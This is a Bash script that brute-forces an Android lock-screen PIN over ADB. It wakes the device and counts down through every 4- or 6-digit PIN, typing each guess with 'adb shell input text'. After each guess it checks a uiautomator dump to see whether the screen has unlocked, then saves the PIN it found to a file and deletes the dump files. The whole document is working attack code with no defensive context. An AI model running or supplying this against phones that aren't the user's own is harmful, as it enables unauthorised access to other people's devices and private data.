#############################################
alias Button='./adbTouch.sh'
alias Text='adb shell input text '
alias ScreenOn='adb shell input keyevent 26'
alias Enter='adb shell input keyevent 66'
alias EnterPass='adb shell input keyevent 82'
#############################################
Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)

while [ $Connected != "device" ] ;
do
clear
echo "[ADB] Waiting for device... "
sleep 2
clear
echo "[ADB] Waiting for device.."
sleep 1
clear 
echo "[ADB] Waiting for device."
clear 
Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)
done
echo "[ADB] Connected !"
ScreenOn
echo "[ADB] Screen on"
EnterPass
echo "[ADB] Go to input"

echo "#####################################"
echo "[APC] How much digits is on screen ?"
echo "#####################################"
echo "  1) 4-Digits"
echo "  2) 6-Digits"
 
read n
clear
case $n in
  1)
	echo "[AFC] selected 4-Digits"
	gen=9999
	EnterPass


if [ True ]
then
   while [ True ];
		do
		gen=$(($gen-1)) 
		echo "[AFC] trying $gen"
		Text $gen
		Enter
                adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
		if cat /tmp/view.xml  |grep -q "Pin"
                then echo ""
                else 
                   echo "[AFC] UNLOCKED with $gen !" 
                   touch  $gen.is.pin
                   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
                   break
                fi

done
fi

	;;
  2) 
	echo "[AFC] selected 6-Digits"
	gen=999999
	EnterPass

if [ True ]
then
   while [ True ];
                do
                gen=$(($gen-1)) 
		echo "[AFC] Trying $gen"
                Text $gen
                Enter
		adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
		if cat /tmp/view.xml  |grep -q "Pin" 
                then echo ""
                else 
		   echo "[AFC] UNLOCKED with $gen !" 
		   touch  $gen.is.pin
		   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
	  	   break
                fi
 

done
fi  




	;;
  *) echo "[AFC] invalid option"
   ./main.sh
	;;
esac
